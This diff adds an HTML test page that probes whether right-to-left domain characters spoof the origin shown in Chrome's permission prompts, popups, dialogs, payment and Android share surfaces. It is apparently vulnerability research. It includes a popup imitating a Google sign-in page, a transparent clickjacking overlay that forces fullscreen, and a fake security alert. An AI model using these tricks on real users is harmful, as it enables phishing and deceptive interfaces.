@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>RTL Origin Spoof - UI Surfaces Test</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #0a0a0f; color: #ddd; padding: 16px; }
+  h2 { font-size: 16px; color: #ff4444; margin: 16px 0 6px; }
+  button { padding: 12px 14px; margin: 4px; border: 1px solid #444; background: #1a1a2e; color: #fff; border-radius: 6px; cursor: pointer; font-size: 12px; }
+  button:active { opacity: .7; }
+  .info { color: #888; font-size: 11px; margin: 4px 0; }
+  pre { background: #111; padding: 10px; border-radius: 6px; font-size: 10px; overflow-x: auto; max-height: 180px; }
+</style>
+</head>
+<body>
+
+<h2>RTL Origin Spoof - Browser UI Surface Tests</h2>
+<p class="info">Test if RTL/Arabic chars spoof origin in different Chrome UI surfaces</p>
+
+<h3>1. Permission Prompts</h3>
+<button onclick="testGeo()">Geolocation Prompt</button>
+<button onclick="testNotif()">Notification Prompt</button>
+<button onclick="testCamera()">Camera Prompt</button>
+<button onclick="testMic()">Microphone Prompt</button>
+
+<h3>2. Popup Windows</h3>
+<button onclick="testPopup()">Popup (minimal UI)</button>
+<button onclick="testPopupNoBar()">Popup (no location bar)</button>
+<button onclick="testPopupName()">Popup (named window)</button>
+
+<h3>3. Dialogs & Prompts</h3>
+<button onclick="testAlert()">alert() dialog origin</button>
+<button onclick="testBeforeUnload()">BeforeUnload origin</button>
+<button onclick="testPayment()">Payment Request sheet</button>
+
+<h3>4. Android-Specific</h3>
+<button onclick="testIntent()">Intent:// URL chooser</button>
+<button onclick="testInstall()">PWA Install prompt</button>
+<button onclick="testShare()">Web Share sheet</button>
+
+<h3>5. Scroll Spoof (No Permission)</h3>
+<button onclick="location.href='scroll-spoof.html'">Open Scroll Spoof POC</button>
+
+<h3>6. Clickjacking + Fullscreen Combo</h3>
+<button onclick="testClickjack()">Clickjack Fullscreen Trigger</button>
+
+<hr>
+<pre id="log">[*] Tap buttons to test each Chrome UI surface.
+[*] Observe the origin displayed in each prompt/dialog.
+[*] If the origin shows RTL-spoofed text, the surface is vulnerable.</pre>
+
+<script>
+function L(m) {
+  var l = document.getElementById('log');
+  l.textContent += '\n' + new Date().toLocaleTimeString() + ' ' + m;
+  l.scrollTop = l.scrollHeight;
+}
+
+// 1. Permission Prompts
+function testGeo() {
+  L('Testing geolocation prompt origin...');
+  navigator.geolocation.getCurrentPosition(
+    function(){ L('Geo ALLOWED - check prompt origin'); },
+    function(){ L('Geo DENIED - check prompt origin'); },
+    { timeout: 5000 }
+  );
+}
+
+function testNotif() {
+  L('Testing notification prompt origin...');
+  if ('Notification' in window) {
+    Notification.requestPermission().then(function(r) {
+      L('Notification: ' + r + ' - check prompt origin for RTL spoof');
+    });
+  }
+}
+
+function testCamera() {
+  L('Testing camera prompt origin...');
+  navigator.mediaDevices.getUserMedia({video:true})
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop();}); L('Camera ALLOWED'); })
+    .catch(function(){ L('Camera DENIED - check prompt origin'); });
+}
+
+function testMic() {
+  L('Testing mic prompt origin...');
+  navigator.mediaDevices.getUserMedia({audio:true})
+    .then(function(s){ s.getTracks().forEach(function(t){t.stop();}); L('Mic ALLOWED'); })
+    .catch(function(){ L('Mic DENIED - check prompt origin'); });
+}
+
+// 2. Popups
+function testPopup() {
+  L('Opening popup window...');
+  var w = window.open('', 'test', 'width=500,height=400');
+  if (w) {
+    w.document.write('<h1>Popup Test</h1><p>Origin: ' + w.location.href + '</p><p>Check address bar!</p>');
+    L('Popup opened - check address bar origin');
+  } else { L('Popup blocked'); }
+}
+
+function testPopupNoBar() {
+  L('Opening popup without location bar...');
+  var w = window.open('', 'test2', 'width=400,height=300,location=no,toolbar=no');
+  if (w) {
+    w.document.write('<h1>No Location Bar</h1><p>Popup with location=no</p><p>Can we draw fake UI here?</p>');
+    L('Popup opened (no location bar) - can draw fake UI');
+  } else { L('Popup blocked'); }
+}
+
+function testPopupName() {
+  L('Opening popup with spoofed name...');
+  var w = window.open('', 'Google - Sign In', 'width=450,height=500');
+  if (w) {
+    w.document.write('<!DOCTYPE html><html><head><title>Google Sign In</title><style>body{font-family:Arial;padding:40px;text-align:center}h1{color:#333}</style></head><body><h1>Google Account</h1><p>Sign in to continue</p></body></html>');
+    L('Popup named: ' + w.name);
+  }
+}
+
+// 3. Dialogs
+function testAlert() {
+  L('Showing alert dialog...');
+  L('Check if origin label appears in alert title');
+  alert('Security verification required. Check the dialog origin.');
+}
+
+function testBeforeUnload() {
+  L('Setting beforeunload handler...');
+  window.addEventListener('beforeunload', function(e) {
+    e.preventDefault();
+    e.returnValue = '';
+  });
+  L('Try to close/refresh this page - check origin in leave dialog');
+}
+
+function testPayment() {
+  L('Testing Payment Request origin...');
+  if (!window.PaymentRequest) { L('Not supported'); return; }
+  try {
+    var p = new PaymentRequest(
+      [{supportedMethods:'https://google.com/pay',data:{}}],
+      {total:{label:'Test',amount:{currency:'USD',value:'0.01'}}}
+    );
+    p.show().catch(function(){ L('Payment sheet closed'); });
+    L('Payment sheet opened - check merchant origin');
+  } catch(e) { L('Error: '+e.message); }
+}
+
+// 4. Android
+function testIntent() {
+  L('Testing intent:// URL origin...');
+  L('On Android: intent://play.google.com/store/apps/details#Intent;scheme=https;end');
+  L('The app chooser shows the referrer origin - is it spoofable?');
+  window.location.href = 'intent://play.google.com/store/apps/details#Intent;scheme=https;package=com.android.vending;end';
+}
+
+function testInstall() {
+  L('Testing PWA install prompt origin...');
+  L('Requires: service worker + manifest + engagement');
+  L('Check install dialog origin for RTL spoof potential');
+}
+
+function testShare() {
+  L('Testing Web Share sheet origin...');
+  if (navigator.share) {
+    navigator.share({title:'Test',text:'Check origin',url:window.location.href})
+      .catch(function(){ L('Share cancelled'); });
+    L('Share sheet opened - check origin display');
+  } else { L('Web Share not supported'); }
+}
+
+// 5. Clickjack + Fullscreen
+function testClickjack() {
+  L('Creating hidden fullscreen trigger...');
+  // Transparent overlay that triggers fullscreen on any tap
+  var overlay = document.createElement('div');
+  overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:transparent;';
+  overlay.addEventListener('click', function() {
+    document.documentElement.requestFullscreen().catch(function(){});
+    L('Fullscreen triggered via clickjack overlay!');
+    overlay.remove();
+  });
+  document.body.appendChild(overlay);
+  L('Tap anywhere on screen to trigger fullscreen');
+}
+
+L('Ready. Test each surface above.');
+L('To test RTL origin: access this page via RTL domain');
+L('Example: http://xn--mgb.test.local:8080/rtl-surfaces.html');
+</script>
+</body>
+</html>
